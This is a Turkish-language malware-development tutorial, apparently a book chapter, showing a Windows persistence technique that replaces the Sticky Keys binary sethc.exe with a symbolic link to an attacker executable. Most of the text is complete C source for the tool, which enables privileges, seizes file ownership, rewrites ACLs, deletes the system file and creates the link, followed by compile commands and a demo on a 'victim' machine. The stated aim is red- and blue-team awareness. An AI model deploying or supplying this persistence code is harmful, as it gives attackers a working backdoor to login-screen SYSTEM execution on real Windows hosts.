\newpage
\subsection{91. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 25. Meşru bir uygulamadan zararlıya sembolik bağlantı oluşturma. Basit C örneği.}

﷽

![pers](./images/128/2024-07-14_13-00_1.png){width="80%"}    

Daha önceki [gönderilerden birinde](https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html), Erişilebilirlik (Accessibility) özelliklerini kullanarak kalıcılık sağlamak için yaygın olarak kullanılan teknikleri ele almıştım. APT3, APT29 ve APT41 gibi APT grupları, bilgisayarlara sızdıklarında bu yöntemi aktif olarak kullandı.    

Bu gönderide, aynı tekniğin farklı bir mantıkla nasıl uygulanabileceğini göstereceğim: Geçerli bir uygulamadan zararlı bir uygulamaya sembolik bağlantı (symlink) oluşturarak.     

### sembolik bağlantı oluşturma. erişilebilirlik özellikleri

Saldırganların kalıcılık elde etmek için kullandığı iyi bilinen bir yöntem, Windows erişilebilirlik yeteneklerini yeniden yönlendiren sembolik bağlantılar (symlink) oluşturmaktır. Bu yöntem, sadece binary dosyaları değiştirmekten daha karmaşıktır, çünkü geçerli bir sistem dosyasından veya özellikten zararlı bir dosyayın yönlenmesi için bir symlink oluşturmayı içerir. Sistem veya bir kullanıcı orijinal dosyayı ya da özelliği çalıştırmaya çalıştığında, farkında olmadan zararlı dosyaya yönlendirilir.    

### pratik örnek

Mantık oldukça basit görünüyor, şu şekilde:    

```cpp
#include <windows.h>
#include <stdio.h>

int main() {
  // meşru ikili dosyanın yolu (Sticky Keys gibi)
  const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
  // kötü amaçlı ikili dosyanın yolu
  const char* meowApp = "Z:\\hack.exe";

  // orijinal dosyayı sil (yönetici yetkileri gerektirir)
  if (!DeleteFileA((LPCSTR)legitApp)) {
    printf("orijinal dosya silinirken hata: %d\n", GetLastError());
    return 1;
  }
  printf("orijinal dosya başarıyla silindi\n");
  CloseHandle(hFile);

  // sembolik bağlantı oluştur
  if (!CreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
    printf("sembolik bağlantı oluşturulurken hata: %d\n", GetLastError());
    return 1;
  }
  printf("meow için sembolik bağlantı başarıyla oluşturuldu =^..^=\n");
  return 0;
}
```

ancak gerçekte her şey biraz daha karmaşık.    

Diyelim ki elimizde bir "kötü amaçlı yazılım" var:    

```cpp
/*
* hack.c
* symlink kalıcılık
* yöntemi için "kötü amaçlı yazılım"
* yazar: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/08/malware-pers-25.html
*/
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Ve meşru bir uygulama için sembolik bağlantı oluşturmak istiyorum:    

```powershell
const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
```

Öncelikle, izinlere ihtiyacımız var:    

```cpp
SE_TAKE_OWNERSHIP_NAME
SE_DEBUG_NAME
SE_RESTORE_NAME
SE_BACKUP_NAME
```

Bunun için sadece `setPrivilege` fonksiyonunu kullanın:    

```cpp
// yetki ayarla
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), 
  TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), 
  (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "%s yetkisi başarıyla etkinleştirildi :)\n" : 
  "%s yetkisi etkinleştirilemedi :(\n", priv);
  return res;
}
```

Görebileceğiniz gibi, bu fonksiyon belirli bir yetkiyi mevcut işlem için etkinleştirmek için kullanılır.

Daha sonra, gerekli erişim izinleri (`WRITE_OWNER` ve `WRITE_DAC`) ile meşru ikili dosyayı açıyoruz:    

```cpp
HANDLE hFile = CreateFileA((LPCSTR)legitApp, WRITE_OWNER | WRITE_DAC, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
```

Ardından, belirteç bilgilerini alıyoruz:       

```cpp
// obtain the SID for the current user
HANDLE hToken;
DWORD dwSize = 0;
PTOKEN_USER pTokenUser = NULL;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
  printf("Failed to open process token: %d\n", GetLastError());
  CloseHandle(hFile);
  return 1;
}
printf("open process token: ok\n");

// get the required size for the token information
GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
pTokenUser = (PTOKEN_USER)malloc(dwSize);
if (pTokenUser == NULL) {
  printf("failed to allocate memory for token information\n");
  CloseHandle(hToken);
  CloseHandle(hFile);
  return 1;
}
printf("allocate memory token info: ok\n");

// get the token information
if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
  printf("failed to get token information: %d\n", GetLastError());
  free(pTokenUser);
  CloseHandle(hToken);
  CloseHandle(hFile);
  return 1;
}
printf("get token info: ok\n");
```

Sonraki adımda, meşru ikili dosyanın sahipliğini geçerli kullanıcı olarak değiştirmemiz gerekiyor:      

```cpp
// initialize a security descriptor
SECURITY_DESCRIPTOR sd;
if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
  printf("failed to initialize security descriptor: %d\n", GetLastError());
  free(pTokenUser);
  CloseHandle(hToken);
  CloseHandle(hFile);
  return 1;
}
printf("init security descriptor: ok\n");

// set the owner in the security descriptor
if (!SetSecurityDescriptorOwner(&sd, pTokenUser->User.Sid, FALSE)) {
  printf("failed to set security descriptor owner: %d\n", GetLastError());
  free(pTokenUser);
  CloseHandle(hToken);
  CloseHandle(hFile);
  return 1;
}
printf("setting security descriptor owner: ok\n");

// apply the security descriptor to the file
if (!SetFileSecurityA(legitApp, OWNER_SECURITY_INFORMATION, &sd)) {
  printf("error setting file ownership: %d\n", GetLastError());
  free(pTokenUser);
  CloseHandle(hToken);
  CloseHandle(hFile);
  return 1;
}
printf("setting file ownership: ok\n");
```

- `InitializeSecurityDescriptor` - yeni bir güvenlik tanımlayıcısı başlatır.   
- `SetSecurityDescriptorOwner` - güvenlik tanımlayıcısındaki sahibi, geçerli kullanıcının SID'si (Güvenlik Tanımlayıcısı) olarak ayarlar.   
- `SetFileSecurityA` - sahipliği değiştirmek için güvenlik tanımlayıcısını meşru ikili dosyaya uygular.    

Daha sonra, dosyaya yeni ACL uygulanır:     

```cpp
// set full control for the current user
EXPLICIT_ACCESS ea;
PACL pNewAcl = NULL;

ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
ea.grfAccessPermissions = GENERIC_ALL;
ea.grfAccessMode = SET_ACCESS;
ea.grfInheritance = NO_INHERITANCE;
ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;

if (SetEntriesInAcl(1, &ea, NULL, &pNewAcl) != ERROR_SUCCESS) {
  printf("error setting new ACL: %d\n", GetLastError());
  free(pTokenUser);
  CloseHandle(hToken);
  CloseHandle(hFile);
  return 1;
}
printf("setting new ACL: ok\n");

if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, 
NULL, NULL, pNewAcl, NULL) != ERROR_SUCCESS) {
  printf("error setting security info: %d\n", GetLastError());
  free(pTokenUser);
  CloseHandle(hToken);
  CloseHandle(hFile);
  LocalFree(pNewAcl);
  return 1;
}
printf("setting security info: ok\n");

free(pTokenUser);
CloseHandle(hToken);
LocalFree(pNewAcl);
```

Son olarak, orijinal dosyayı silin ve sembolik bağlantıyı ayarlayın:     

```cpp
// delete the original file (requires administrative privileges)
if (!DeleteFileA((LPCSTR)legitApp)) {
  printf("error deleting original file: %d\n", GetLastError());
  return 1;
}
printf("original file deleted successfully\n");
CloseHandle(hFile);

HMODULE kernel = GetModuleHandle("kernel32.dll");
pCreateSymbolicLinkA = (BOOLEAN(WINAPI *)(LPCSTR, LPCSTR, DWORD))
GetProcAddress(kernel, (LPCSTR)"CreateSymbolicLinkA");

// create the symbolic link
if (!pCreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
  printf("error creating symlink: %d\n", GetLastError());
  return 1;
}

printf("symlink to meow created successfully =^..^=\n");
return 0;
```

Gördüğünüz gibi, bu oldukça karmaşıktır. Bu PoC, Windows API'yi kullanarak ayrıcalıkları ayarlama, dosya sahipliğini değiştirme, ACL'leri ayarlama, dosya silme ve sembolik bağlantı oluşturma işlemlerini nasıl gerçekleştireceğimizi göstermektedir.

`system32` klasöründen orijinal dosyayı hemen silmeye çalışırsanız, "erişim reddedildi" hatası alırsınız.    

Ayrıca, mevcut kullanıcı için SID elde etme ve ayarlama işlemleri yanlışsa, "hata `1337` geçersiz sahip" gibi bir hata alabilirsiniz.    

Nihai kaynak kodu şu şekilde görünmektedir `pers.c`:

```cpp
/*
* pers.c
* symlink persistence trick
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/08/malware-pers-25.html
*/
#include <windows.h>
#include <stdio.h>
#include <aclapi.h> // for OWNER_SECURITY_INFORMATION
#include <sddl.h> // for ConvertStringSidToSid ???

BOOLEAN (WINAPI * pCreateSymbolicLinkA)(
  LPCSTR lpSymlinkFileName,
  LPCSTR lpTargetFileName,
  DWORD  dwFlags
);

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) 
  res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), 
  (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : 
  "failed to enable %s :(\n", 
  priv);
  return res;
}

int main() {
  // path to the legitimate binary (e.g., Sticky Keys)
  const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
  // path to the malicious binary
  const char* meowApp = "Z:\\hack.exe";

  if (!setPrivilege(SE_TAKE_OWNERSHIP_NAME)) return -1;
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  if (!setPrivilege(SE_RESTORE_NAME)) return -1;
  if (!setPrivilege(SE_BACKUP_NAME)) return -1;

  HANDLE hFile = CreateFileA((LPCSTR)legitApp, GENERIC_WRITE, 
  FILE_SHARE_READ, NULL, OPEN_EXISTING, 
  FILE_ATTRIBUTE_NORMAL, NULL);

  // obtain the SID for the current user
  HANDLE hToken;
  DWORD dwSize = 0;
  PTOKEN_USER pTokenUser = NULL;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
    printf("Failed to open process token: %d\n", GetLastError());
    CloseHandle(hFile);
    return 1;
  }
  printf("open process token: ok\n");

  // get the required size for the token information
  GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
  pTokenUser = (PTOKEN_USER)malloc(dwSize);
  if (pTokenUser == NULL) {
    printf("failed to allocate memory for token information\n");
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("allocate memory token info: ok\n");

  // get the token information
  if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
    printf("failed to get token information: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("get token info: ok\n");

  // initialize a security descriptor
  SECURITY_DESCRIPTOR sd;
  if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
    printf("failed to initialize security descriptor: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("init security descriptor: ok\n");

  // set the owner in the security descriptor
  if (!SetSecurityDescriptorOwner(&sd, pTokenUser->User.Sid, FALSE)) {
    printf("failed to set security descriptor owner: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("setting security descriptor owner: ok\n");

  // apply the security descriptor to the file
  if (!SetFileSecurityA(legitApp, OWNER_SECURITY_INFORMATION, &sd)) {
    printf("error setting file ownership: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("setting file ownership: ok\n");

  // set full control for the current user
  EXPLICIT_ACCESS ea;
  PACL pNewAcl = NULL;

  ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
  ea.grfAccessPermissions = GENERIC_ALL;
  ea.grfAccessMode = SET_ACCESS;
  ea.grfInheritance = NO_INHERITANCE;
  ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
  ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
  ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;

  if (SetEntriesInAcl(1, &ea, NULL, &pNewAcl) != ERROR_SUCCESS) {
    printf("error setting new ACL: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("setting new ACL: ok\n");

  if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, 
  NULL, pNewAcl, NULL) != ERROR_SUCCESS) {
    printf("error setting security info: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    LocalFree(pNewAcl);
    return 1;
  }
  printf("setting security info: ok\n");

  free(pTokenUser);
  CloseHandle(hToken);
  LocalFree(pNewAcl);

  // delete the original file (requires administrative privileges)
  if (!DeleteFileA((LPCSTR)legitApp)) {
    printf("error deleting original file: %d\n", GetLastError());
    return 1;
  }
  printf("original file deleted successfully\n");
  CloseHandle(hFile);

  HMODULE kernel = GetModuleHandle("kernel32.dll");
  pCreateSymbolicLinkA = (BOOLEAN(WINAPI *)(LPCSTR, LPCSTR, DWORD))
  GetProcAddress(kernel, (LPCSTR)"CreateSymbolicLinkA");

  // create the symbolic link
  if (!pCreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
    printf("error creating symlink: %d\n", GetLastError());
    return 1;
  }

  printf("symlink to meow created successfully =^..^=\n");
  return 0;
}
```

Dikkat edin, bu PoC, Windows API işlevleri, dosya güvenliği ve SID (Security Identifier) işleme için gerekli başlık dosyalarını içerir. Ayrıca, `CreateSymbolicLinkA` fonksiyonuna bir işlev işaretçisi içerir (mingw derleyicim hatasız derlemeyi reddettiği için).    

### demo

Şimdi her şeyi çalışırken görelim.         

`meow-meow` "kötü amaçlı yazılımımızı" `hack.c` dosyasını derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![malware](./images/128/2024-07-09_13-20.png){width="80%"}      

Ve kalıcılık betiğini derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![malware](./images/128/2024-07-14_12-54.png){width="80%"}      

Daha sonra, test kurbanının makinesinde (Windows 11 x64) çalıştıralım:    

```powershell
.\pers.exe
```

![malware](./images/128/2024-07-14_13-00.png){width="80%"}      

Gördüğünüz gibi, sembolik bağlantı başarıyla oluşturuldu.    

Son olarak, Shift tuşuna 5 kez basalım:     

![malware](./images/128/2024-07-14_13-00_1.png){width="80%"}      

`hack.exe` dosyasının özelliklerine dikkat edin:     

![malware](./images/128/2024-07-14_16-46.png){width="80%"}      

Gördüğünüz gibi, her şey beklendiği gibi çalıştı. Mükemmel! =^..^=     

Bu PoC, bir saldırganın bir Erişilebilirlik özelliğini kötü amaçlı bir yürütülebilir dosyaya yönlendirmek için nasıl bir sembolik bağlantı oluşturabileceğini gösterir.    

Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.    

[CreateSymbolicLinkA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsymboliclinka)     
[Malware persistence - part 12. Accessibility features](https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2024-07-08-malware-pers-25)    
